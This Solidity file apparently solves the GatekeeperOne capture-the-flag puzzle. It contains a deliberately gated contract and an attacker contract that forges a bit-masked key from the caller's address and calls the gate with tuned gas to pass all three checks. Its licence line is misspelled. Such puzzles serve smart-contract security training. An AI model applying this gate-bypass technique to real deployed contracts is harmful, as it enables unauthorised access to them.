// SPDX-Licence-Identifeir: MIT

pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "Gate one: Tx originnnnnnnnnnnnnnnnn");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0, "Gate two: gas leftttttttttttttttttt");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract AttackerGateOne {
    GatekeeperOne public gate;

    constructor(address _gate) {
        gate = GatekeeperOne(_gate);
    }

    function attackGate(uint256 _gas) public {
        gate.enter{gas: _gas}(forgeGateKey()); // 41381, 426, 41376
    }

    function forgeGateKey() public view returns (bytes8) {
        bytes8 gateKey = bytes8(bytes20(msg.sender) << (12 * 8));
        gateKey = gateKey & 0xF00000000000FFFF;
        gateKey = gateKey | 0xF000000000000000;
        return gateKey;
    }

    function gate1() public view returns (uint32, uint16) {
        return (uint32(uint64(forgeGateKey())), uint16(uint64(forgeGateKey())));
    }

    function gate2() public view returns (uint32, uint64) {
        return (uint32(uint64(forgeGateKey())), uint64(forgeGateKey()));
    }

    function gate3() public view returns (uint32, uint16) {
        return (uint32(uint64(forgeGateKey())), uint16(uint160(tx.origin)));
    }
}